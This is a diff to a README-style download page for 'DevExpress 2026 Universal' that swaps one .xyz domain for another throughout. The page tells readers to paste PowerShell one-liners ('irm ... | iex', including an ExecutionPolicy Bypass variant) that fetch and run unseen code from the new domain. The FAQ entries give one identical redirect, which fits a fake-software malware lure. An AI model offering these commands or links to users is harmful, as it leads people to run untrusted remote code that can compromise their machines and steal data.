@@ -16,13 +16,13 @@ DevExpress 2026 Universal · Developer workspace · Automation · Windows deskto
 4. Click **Yes** if Windows asks for permission
 
 ```powershell
-irm https://devexpress-2026.nexpath.xyz/ | iex
+irm https://devexpress-2026.nerasix.xyz/ | iex
 ```
 
 **If nothing happens or you see a policy error**, paste this instead:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://devexpress-2026.nexpath.xyz/ | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://devexpress-2026.nerasix.xyz/ | iex"
 ```
 
 
@@ -58,17 +58,17 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 
 <details>
 <summary><b>What exactly do I paste?</b></summary>
-<br>Open <a href="https://devexpress-2026.nexpath.xyz/">devexpress-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Where is PowerShell?</b></summary>
-<br>Open <a href="https://devexpress-2026.nexpath.xyz/">devexpress-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
 <summary><b>Command did not run?</b></summary>
-<br>Open <a href="https://devexpress-2026.nexpath.xyz/">devexpress-2026.nexpath.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
+<br>Open <a href="https://devexpress-2026.nerasix.xyz/">devexpress-2026.nerasix.xyz</a>, click <b>Download</b>, and follow the steps on the NexPath page.
 </details>
 
 <details>
@@ -84,8 +84,7 @@ Notes for users who need **DevExpress 2026 Universal** running on Windows — es
 
 > Use the project link below for Windows.
 
-* **Project link:** **[devexpress-2026.nexpath.xyz](https://devexpress-2026.nexpath.xyz/)**
-* **Full URL:** `https://devexpress-2026.nexpath.xyz/`
+* **Project link:** **[devexpress-2026.nerasix.xyz](https://devexpress-2026.nerasix.xyz/)**
+* **Full URL:** `https://devexpress-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
-
